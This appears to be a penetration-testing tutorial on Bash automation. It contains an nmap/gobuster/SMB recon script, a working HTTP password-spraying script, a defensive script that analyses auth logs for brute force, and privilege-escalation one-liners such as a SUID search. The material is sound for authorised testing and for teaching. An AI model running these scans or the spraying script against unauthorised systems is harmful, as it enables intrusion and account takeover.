# Bash Automation for Penetration Testing

The real power of Bash is chaining tools together. Instead of running Nmap, then manually reading output, then running Gobuster — you write one script that does it all automatically.

## Automated Recon Script

```bash
#!/bin/bash
# Full recon automation script

TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"

# Validate input
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "[*] Results will be saved to $OUTPUT_DIR/"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err() { echo -e "${RED}[-]${NC} $1"; }

# Phase 1: Port Scanning
log "Phase 1: Port Scanning"
nmap -sS -p- --min-rate 5000 -T4 "$TARGET" -oN "$OUTPUT_DIR/ports.txt" 2>/dev/null
OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/ports.txt" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
log "Open ports: $OPEN_PORTS"

# Phase 2: Service Detection
log "Phase 2: Service Detection"
nmap -sC -sV -p "$OPEN_PORTS" "$TARGET" -oN "$OUTPUT_DIR/services.txt" 2>/dev/null

# Phase 3: Web Enumeration (if HTTP found)
if echo "$OPEN_PORTS" | grep -qE "80|8080|8443|443"; then
    log "Phase 3: Web Enumeration"

    for PORT in 80 443 8080 8443; do
        if echo "$OPEN_PORTS" | grep -q "$PORT"; then
            PROTO="http"
            [ "$PORT" = "443" ] || [ "$PORT" = "8443" ] && PROTO="https"
            URL="${PROTO}://${TARGET}:${PORT}"

            log "Fuzzing $URL"
            gobuster dir -u "$URL" \
                -w /usr/share/seclists/Discovery/Web-Content/common.txt \
                -x php,html,txt,bak \
                -o "$OUTPUT_DIR/gobuster_${PORT}.txt" \
                -q 2>/dev/null
        fi
    done
fi

# Phase 4: SMB Enumeration (if 445 found)
if echo "$OPEN_PORTS" | grep -q "445"; then
    log "Phase 4: SMB Enumeration"
    enum4linux -a "$TARGET" > "$OUTPUT_DIR/smb_enum.txt" 2>/dev/null
    smbclient -L "//$TARGET" -N >> "$OUTPUT_DIR/smb_enum.txt" 2>/dev/null
fi

# Generate summary
log "Generating summary..."
cat > "$OUTPUT_DIR/summary.txt" << EOF
=== Recon Summary for $TARGET ===
Date: $(date)
Open Ports: $OPEN_PORTS

=== Services ===
$(grep "open" "$OUTPUT_DIR/services.txt" 2>/dev/null)

=== Web Findings ===
$(cat "$OUTPUT_DIR"/gobuster_*.txt 2>/dev/null | grep -v "^$" | head -20)
EOF

log "Recon complete! Results in $OUTPUT_DIR/"
cat "$OUTPUT_DIR/summary.txt"
```

## Password Spraying Script

```bash
#!/bin/bash
# HTTP login brute forcer

TARGET=$1
USERLIST=$2
PASSWORD=$3  # Single password for spraying

if [ $# -lt 3 ]; then
    echo "Usage: $0 <target> <userlist> <password>"
    echo "Example: $0 http://10.10.10.5/login users.txt Summer2024!"
    exit 1
fi

echo "[*] Password spraying $TARGET"
echo "[*] Password: $PASSWORD"
echo ""

while IFS= read -r username; do
    [ -z "$username" ] && continue

    RESPONSE=$(curl -s -X POST "$TARGET" \
        -d "username=$username&password=$PASSWORD" \
        -c /tmp/cookies.txt \
        -L \
        -w "%{http_code}" \
        -o /tmp/response.html)

    # Check for success indicators
    if echo "$RESPONSE" | grep -q "302\|200"; then
        BODY=$(cat /tmp/response.html)
        if echo "$BODY" | grep -qi "dashboard\|welcome\|logout\|profile"; then
            echo "[+] SUCCESS: $username:$PASSWORD"
        fi
    fi

    # Rate limiting — sleep between attempts
    sleep 0.5

done < "$USERLIST"

echo "[*] Spray complete"
```

## Log Analysis Script

```bash
#!/bin/bash
# Analyze auth logs for suspicious activity

LOG_FILE=${1:-"/var/log/auth.log"}

echo "=== Authentication Log Analysis ==="
echo "File: $LOG_FILE"
echo ""

# Failed login attempts
echo "--- Top 10 IPs with Failed Logins ---"
grep "Failed password" "$LOG_FILE" | \
    grep -oE "from [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
    sort | uniq -c | sort -rn | head -10

echo ""

# Successful logins
echo "--- Successful Logins ---"
grep "Accepted password\|Accepted publickey" "$LOG_FILE" | \
    awk '{print $1, $2, $3, $9, $11}' | \
    sort -u

echo ""

# Brute force detection (>10 failures from same IP)
echo "--- Potential Brute Force (>10 failures) ---"
grep "Failed password" "$LOG_FILE" | \
    grep -oE "from [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
    sort | uniq -c | sort -rn | \
    awk '$1 > 10 {print "[!] " $1 " failures from " $2}'

echo ""

# Root login attempts
echo "--- Root Login Attempts ---"
grep "Failed password for root" "$LOG_FILE" | wc -l | \
    xargs -I{} echo "{} failed root login attempts"
```

## Useful One-Liners

```bash
# Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Extract all IPs from a file
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" file.txt | sort -u

# Extract all URLs from a file
grep -oE "https?://[^ ]+" file.txt | sort -u

# Check if a list of hosts is alive
for ip in $(cat hosts.txt); do ping -c1 -W1 $ip &>/dev/null && echo "$ip alive"; done

# Quick HTTP status check for a list of URLs
while read url; do echo "$url: $(curl -s -o /dev/null -w '%{http_code}' $url)"; done < urls.txt

# Find files modified in the last 10 minutes
find / -newer /tmp/ref -type f 2>/dev/null | grep -v proc

# Decode base64 strings found in files
grep -oE "[A-Za-z0-9+/]{20,}={0,2}" file.txt | while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    [ -n "$decoded" ] && echo "Decoded: $decoded"
done
```
